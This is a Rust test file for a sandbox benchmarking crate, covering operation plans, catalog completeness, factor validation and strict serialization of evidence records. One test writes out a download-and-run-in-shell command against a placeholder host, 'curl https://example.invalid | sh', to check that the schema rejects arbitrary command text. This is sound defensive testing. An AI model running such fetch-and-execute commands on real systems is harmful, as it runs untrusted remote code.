use std::collections::BTreeSet;

use sandbox_benchmark::definitions::{
    catalog, definition, operation_comparison_key, FactorConstraint, ProfileCatalogId,
};
use sandbox_benchmark::executors::{command, expand_operation_plan, files, layerstack, workspace};
use sandbox_benchmark::model::{
    ExpandedOperationCell, Factor, FactorRole, FamilyId, OperationEvidence, OperationId,
    OperationPlan, ProductAccess, ProductOperation, ResolvedIsolationPolicy, SessionActivity,
    UnitRatio, WorkspaceProfileId,
};
use sandbox_benchmark::resources::Availability;
use sandbox_benchmark::scheduler::{ObservationRecord, OperationObservation};
use serde_json::{json, Value};

fn controlled<T>(value: T) -> Factor<T> {
    Factor {
        role: FactorRole::Controlled,
        values: vec![value],
        control: None,
    }
}

fn varied<T: Clone>(values: &[T], control: T) -> Factor<T> {
    Factor {
        role: FactorRole::Varied,
        values: values.to_vec(),
        control: Some(control),
    }
}

fn workspace_profile(value: &str) -> WorkspaceProfileId {
    value.parse().expect("valid workspace profile id")
}

fn plans() -> Vec<OperationPlan> {
    vec![
        OperationPlan::ExecCommand(command::ExecCommandPlan {
            enabled: true,
            factors: command::ExecCommandFactors {
                concurrent_requests: controlled(3),
                workspace_profile: controlled(workspace_profile("small")),
                session_mode: controlled(command::CommandSessionMode::Explicit),
                command_case: controlled(command::CommandCase::Noop),
            },
        }),
        OperationPlan::FileRead(files::FileReadPlan {
            enabled: true,
            factors: files::FileReadFactors {
                concurrent_requests: controlled(2),
                returned_bytes: controlled(4096),
                source: controlled(files::FileReadSource::Snapshot),
                target_mode: controlled(files::TargetMode::Independent),
            },
        }),
        OperationPlan::FileWrite(files::FileWritePlan {
            enabled: true,
            factors: files::FileWriteFactors {
                concurrent_requests: controlled(2),
                content_bytes: controlled(4096),
                destination: controlled(files::MutationDestination::Session),
                target_mode: controlled(files::TargetMode::Independent),
            },
        }),
        OperationPlan::FileEdit(files::FileEditPlan {
            enabled: true,
            factors: files::FileEditFactors {
                concurrent_requests: controlled(2),
                file_bytes: controlled(4096),
                replacement_count: controlled(1),
                match_density: controlled(UnitRatio(1.0)),
                destination: controlled(files::MutationDestination::Session),
                target_mode: controlled(files::TargetMode::Independent),
            },
        }),
        OperationPlan::FileBlame(files::FileBlamePlan {
            enabled: true,
            factors: files::FileBlameFactors {
                concurrent_requests: controlled(2),
                line_count: controlled(100),
                ownership_segments: controlled(10),
                auditability_event_count: controlled(10),
            },
        }),
        OperationPlan::CreateWorkspace(workspace::CreateWorkspacePlan {
            enabled: true,
            factors: workspace::CreateWorkspaceFactors {
                workspace_count: controlled(5),
                workspace_profile: controlled(workspace_profile("small")),
                network_profile: controlled(
                    sandbox_benchmark::model::AllowedNetworkProfile::Shared,
                ),
            },
        }),
        OperationPlan::SquashLayerstack(layerstack::SquashLayerstackPlan {
            enabled: true,
            factors: layerstack::SquashLayerstackFactors {
                live_sessions: controlled(20),
                requested_migration_ratio: controlled(UnitRatio(1.0)),
                remount_parallelism: controlled(4),
                squashable_blocks: controlled(1),
                layers_per_block: controlled(8),
                payload_bytes: controlled(4096),
                session_activity: controlled(SessionActivity::Idle),
            },
        }),
    ]
}

#[test]
fn closed_ids_have_the_canonical_wire_values() {
    let families = serde_json::to_value(FamilyId::ALL).expect("family ids serialize");
    assert_eq!(
        families,
        json!(["command", "files", "workspace_lifecycle", "layer_stack"])
    );

    let operations = serde_json::to_value(OperationId::ALL).expect("operation ids serialize");
    assert_eq!(
        operations,
        json!([
            "exec_command",
            "file_read",
            "file_write",
            "file_edit",
            "file_blame",
            "create_workspace",
            "squash_layerstack"
        ])
    );
}

#[test]
fn catalog_is_complete_and_self_describing() {
    let catalog = catalog();
    assert_eq!(catalog.families.len(), FamilyId::ALL.len());
    assert_eq!(catalog.operations.len(), OperationId::ALL.len());
    assert!(!catalog.metrics.is_empty());
    assert_eq!(catalog.workspace_profiles.schema_version, 1);
    assert_eq!(catalog.workspace_profiles.profiles.len(), 3);
    assert!(catalog
        .workspace_profiles
        .profiles
        .iter()
        .any(|profile| profile.id.as_str() == "large" && !profile.standard));
    assert!(catalog
        .metrics
        .iter()
        .all(|metric| { !metric.id.is_empty() && metric.semantic_revision > 0 }));

    for family in catalog.families {
        assert!(!family.label.is_empty());
        assert!(!family.help.is_empty());
        assert!(!family.research_question.is_empty());
        assert!(!family.measured_boundary.is_empty());
    }

    for id in OperationId::ALL {
        let operation = definition(id);
        assert_eq!(operation.id, id);
        assert!(!operation.label.is_empty());
        assert!(!operation.help.is_empty());
        assert!(!operation.measured_boundary.is_empty());
        assert!(!operation.count_semantics_help.is_empty());
        assert!(operation.semantic_revision > 0);
        assert!(operation.factor_schema_revision > 0);
        assert!(operation.comparison.semantic_revision > 0);
        assert_eq!(
            operation.supported_cohorts,
            &[sandbox_benchmark::model::ClientCohort::DirectClient]
        );

        let factors = operation
            .factors
            .iter()
            .map(|factor| factor.id)
            .collect::<Vec<_>>();
        assert_eq!(factors, operation.comparison.factors);
        assert!(operation
            .factors
            .iter()
            .all(|factor| !factor.label.is_empty() && !factor.help.is_empty()));
        assert!(operation
            .checks
            .iter()
            .all(|check| !check.label.is_empty() && !check.help.is_empty()));
        assert!(operation
            .phases
            .iter()
            .all(|phase| !phase.label.is_empty() && !phase.help.is_empty()));
    }

    for operation_id in [OperationId::ExecCommand, OperationId::CreateWorkspace] {
        let profile_factor = definition(operation_id)
            .factors
            .iter()
            .find(|factor| factor.id == sandbox_benchmark::model::FactorId::WorkspaceProfile)
            .expect("workspace operation declares its profile factor");
        assert_eq!(
            profile_factor.constraint,
            FactorConstraint::ProfileCatalog {
                catalog: ProfileCatalogId::WorkspaceProfiles,
            }
        );
    }
}

#[test]
fn workspace_profile_ids_are_scalar_extensible_and_strict() {
    let id: WorkspaceProfileId =
        serde_json::from_value(json!("metadata_heavy")).expect("same-generator profile id parses");
    assert_eq!(id.as_str(), "metadata_heavy");
    assert_eq!(
        serde_json::to_value(&id).expect("profile id serializes"),
        json!("metadata_heavy")
    );

    for invalid in [
        "",
        "MetadataHeavy",
        "metadata-heavy",
        "metadata__heavy",
        "9profile",
    ] {
        assert!(serde_json::from_value::<WorkspaceProfileId>(json!(invalid)).is_err());
    }
}

#[test]
fn public_access_references_the_product_catalog() {
    let expected = [
        (OperationId::ExecCommand, "exec_command"),
        (OperationId::FileRead, "file_read"),
        (OperationId::FileWrite, "file_write"),
        (OperationId::FileEdit, "file_edit"),
        (OperationId::FileBlame, "file_blame"),
        (OperationId::SquashLayerstack, "squash_layerstacks"),
    ];
    for (id, product_name) in expected {
        let ProductAccess::PublicGateway(operation) = definition(id).product_access else {
            panic!("{id:?} must use the public gateway")
        };
        assert_eq!(operation.catalog_spec().name, product_name);
    }
    assert!(matches!(
        definition(OperationId::CreateWorkspace).product_access,
        ProductAccess::InternalWorkspace(_)
    ));

    let product_names = [
        ProductOperation::ExecCommand,
        ProductOperation::FileRead,
        ProductOperation::FileWrite,
        ProductOperation::FileEdit,
        ProductOperation::FileBlame,
        ProductOperation::SquashLayerstacks,
    ]
    .map(|operation| operation.catalog_spec().name)
    .into_iter()
    .collect::<BTreeSet<_>>();
    assert_eq!(product_names.len(), 6);
}

#[test]
fn all_seven_plans_expand_through_the_typed_dispatch() {
    let expected_requests = [3, 2, 2, 2, 2, 5, 1];
    for (index, plan) in plans().iter().enumerate() {
        let cells = expand_operation_plan(plan).expect("sample plan expands");
        assert_eq!(cells.len(), 1);
        assert_eq!(cells[0].id(), plan.id());
        assert_eq!(
            cells[0].measured_invocation_count(),
            expected_requests[index]
        );
        assert_eq!(operation_comparison_key(&cells[0]).operation, plan.id());
    }
}

#[test]
fn layerstack_n_is_load_and_never_request_concurrency() {
    let layerstack = plans().pop().expect("sample layerstack plan exists");
    let cell = expand_operation_plan(&layerstack)
        .expect("sample layerstack plan expands")
        .pop()
        .expect("sample layerstack cell exists");
    assert!(matches!(cell, ExpandedOperationCell::SquashLayerstack(_)));
    assert_eq!(cell.measured_invocation_count(), 1);
    assert_eq!(
        cell.resolved_isolation(),
        ResolvedIsolationPolicy::FreshTopologyPerTrial
    );
}

#[test]
fn factor_roles_are_canonical_and_strict() {
    let mut invalid = plans().remove(0);
    if let OperationPlan::ExecCommand(plan) = &mut invalid {
        plan.factors.concurrent_requests = varied(&[1], 1);
    } else {
        unreachable!()
    }
    let errors = sandbox_benchmark::executors::validate_operation_plan(&invalid);
    assert!(errors.iter().any(|error| {
        error.violation == sandbox_benchmark::model::FactorViolation::VariedValueCount
    }));

    if let OperationPlan::ExecCommand(plan) = &mut invalid {
        plan.factors.concurrent_requests = Factor {
            role: FactorRole::Controlled,
            values: vec![1, 2],
            control: Some(1),
        };
    } else {
        unreachable!()
    }
    let errors = sandbox_benchmark::executors::validate_operation_plan(&invalid);
    assert!(errors.iter().any(|error| {
        error.violation == sandbox_benchmark::model::FactorViolation::ControlledValueCount
    }));
    assert!(errors.iter().any(|error| {
        error.violation == sandbox_benchmark::model::FactorViolation::ControlledHasControl
    }));
}

#[test]
fn tagged_plan_and_cell_variants_are_exactly_the_closed_set() {
    let expected = OperationId::ALL
        .map(|id| {
            serde_json::to_value(id)
                .expect("operation id serializes")
                .as_str()
                .expect("operation id serializes as a string")
                .to_owned()
        })
        .into_iter()
        .collect::<BTreeSet<_>>();
    let plans = plans();
    let plan_tags = plans
        .iter()
        .map(|plan| {
            serde_json::to_value(plan).expect("operation plan serializes")["operation"]
                .as_str()
                .expect("operation plan has a string tag")
                .to_owned()
        })
        .collect::<BTreeSet<_>>();
    assert_eq!(plan_tags, expected);

    let cell_tags = plans
        .iter()
        .flat_map(|plan| expand_operation_plan(plan).expect("sample plan expands"))
        .map(|cell| {
            serde_json::to_value(cell).expect("operation cell serializes")["operation"]
                .as_str()
                .expect("operation cell has a string tag")
                .to_owned()
        })
        .collect::<BTreeSet<_>>();
    assert_eq!(cell_tags, expected);
}

#[test]
fn evidence_variants_are_exactly_the_closed_set() {
    let empty_output = || command::BoundedOutputEvidence {
        byte_count: 0,
        truncated: false,
        sha256: "sha256:empty".into(),
    };
    let snapshot = layerstack::StorageSnapshot {
        monotonic_offset_ns: Availability::Available { value: 0 },
        sampled: false,
        manifest_version: Availability::Available { value: 1 },
        root_hash: Availability::Available {
            value: "root-empty".into(),
        },
        active_layer_count: Availability::Available { value: 0 },
        active_lease_count: Availability::Available { value: 0 },
        active_logical_bytes: Availability::Available { value: 0 },
        active_allocated_bytes: Availability::Unavailable {
            source: "product_query".into(),
            reason: "not_reported".into(),
        },
        storage_logical_bytes: Availability::Available { value: 0 },
        storage_allocated_bytes: Availability::Unavailable {
            source: "product_query".into(),
            reason: "not_reported".into(),
        },
        staging_entry_count: Availability::Available { value: 0 },
    };
    let evidence = [
        OperationEvidence::ExecCommand(command::ExecCommandEvidence {
            command_case: command::CommandCase::Noop,
            template_revision: 1,
            command_sha256: "sha256:true".into(),
            exit_code: Some(0),
            stdout: empty_output(),
            stderr: empty_output(),
        }),
        OperationEvidence::FileRead(files::FileReadEvidence {
            requested_bytes: 1,
            returned_bytes: 1,
            returned_lines: 1,
            content_sha256: "sha256:read".into(),
        }),
        OperationEvidence::FileWrite(files::FileWriteEvidence {
            requested_bytes: 1,
            observed_bytes: 1,
            expected_sha256: "sha256:write".into(),
            observed_sha256: "sha256:write".into(),
            attribution: files::MutationAttribution::WorkspaceSession,
            attributed_layer_count: 0,
        }),
        OperationEvidence::FileEdit(files::FileEditEvidence {
            requested_replacements: 1,
            applied_replacements: 1,
            before_sha256: "sha256:before".into(),
            expected_sha256: "sha256:after".into(),
            observed_sha256: "sha256:after".into(),
            attribution: files::MutationAttribution::WorkspaceSession,
            attributed_layer_count: 0,
        }),
        OperationEvidence::FileBlame(files::FileBlameEvidence {
            requested_lines: 1,
            returned_ranges: 1,
            covered_lines: 1,
            expected_ownership_segments: 1,
            matched_ownership_segments: 1,
            observed_auditability_events: 1,
        }),
        OperationEvidence::CreateWorkspace(workspace::CreateWorkspaceEvidence {
            requested_count: 1,
            created_count: 1,
            ready_count: 1,
            destroyed_count: 1,
            network_profile_matches: 1,
            registry_baseline_restored: true,
        }),
        OperationEvidence::SquashLayerstack(Box::new(layerstack::SquashLayerstackEvidence {
            requested_live_sessions: 0,
            observed_migrated_sessions: 0,
            observed_non_migrated_sessions: 0,
            dispositions: layerstack::SessionDispositionCounts {
                migrated: 0,
                identity: 0,
                leased: 0,
                faulty: 0,
                session_gone: 0,
            },
            effective_remount_parallelism: 0,
            observed_squashed_block_count: 0,
            observed_replaced_layer_count: 0,
            source_layer_ids: Vec::new(),
            retained_source_layer_ids: Vec::new(),
            source_layer_allocations: Vec::new(),
            reclaimed_bytes: Availability::Unavailable {
                source: "product_query".into(),
                reason: "not_reported".into(),
            },
            s0_baseline: snapshot.clone(),
            s1_sampled_peak: snapshot.clone(),
            s2_post_commit: snapshot.clone(),
            s3_settled: snapshot,
            manifest_reduced: true,
            content_equivalent: true,
            usable_session_count: 0,
        })),
    ];

    let tags = evidence
        .iter()
        .map(|item| {
            serde_json::to_value(item).expect("operation evidence serializes")["operation"]
                .as_str()
                .expect("operation evidence has a string tag")
                .to_owned()
        })
        .collect::<BTreeSet<_>>();
    let expected = OperationId::ALL
        .map(|id| {
            serde_json::to_value(id)
                .expect("operation id serializes")
                .as_str()
                .expect("operation id serializes as a string")
                .to_owned()
        })
        .into_iter()
        .collect::<BTreeSet<_>>();
    assert_eq!(tags, expected);
}

#[test]
fn operation_observation_wraps_correlated_evidence_strictly() {
    let evidence = OperationEvidence::ExecCommand(command::ExecCommandEvidence {
        command_case: command::CommandCase::Noop,
        template_revision: 1,
        command_sha256: "sha256:true".into(),
        exit_code: Some(0),
        stdout: command::BoundedOutputEvidence {
            byte_count: 0,
            truncated: false,
            sha256: "sha256:empty".into(),
        },
        stderr: command::BoundedOutputEvidence {
            byte_count: 0,
            truncated: false,
            sha256: "sha256:empty".into(),
        },
    });
    let record = ObservationRecord::Operation(OperationObservation {
        operation_id: OperationId::ExecCommand,
        cell_id: "cell-1".into(),
        trial_id: "trial-1".into(),
        request_id: None,
        evidence,
    });

    let serialized = serde_json::to_value(&record).expect("serialize operation observation");
    assert_eq!(serialized["record"], "operation");
    assert_eq!(serialized["data"]["operation_id"], "exec_command");
    assert_eq!(serialized["data"]["evidence"]["operation"], "exec_command");
    assert_eq!(
        serde_json::from_value::<ObservationRecord>(serialized.clone())
            .expect("roundtrip operation observation"),
        record
    );

    let mut unknown = serialized;
    unknown["data"]["unexpected"] = json!(true);
    assert!(serde_json::from_value::<ObservationRecord>(unknown).is_err());
}

#[test]
fn unknown_fields_and_arbitrary_command_text_are_rejected() {
    let command = serde_json::to_value(&plans()[0]).expect("sample command plan serializes");
    let mut extra_top_level = command.clone();
    extra_top_level
        .as_object_mut()
        .expect("operation plan serializes as an object")
        .insert("handler".into(), Value::String("plugin".into()));
    assert!(serde_json::from_value::<OperationPlan>(extra_top_level).is_err());

    let mut arbitrary_command = command;
    arbitrary_command["configuration"]["factors"]["command"] =
        Value::String("curl https://example.invalid | sh".into());
    assert!(serde_json::from_value::<OperationPlan>(arbitrary_command).is_err());

    let unknown_variant = json!({
        "operation": "browser_executor",
        "configuration": {"enabled": true, "factors": {}}
    });
    assert!(serde_json::from_value::<OperationPlan>(unknown_variant).is_err());
}
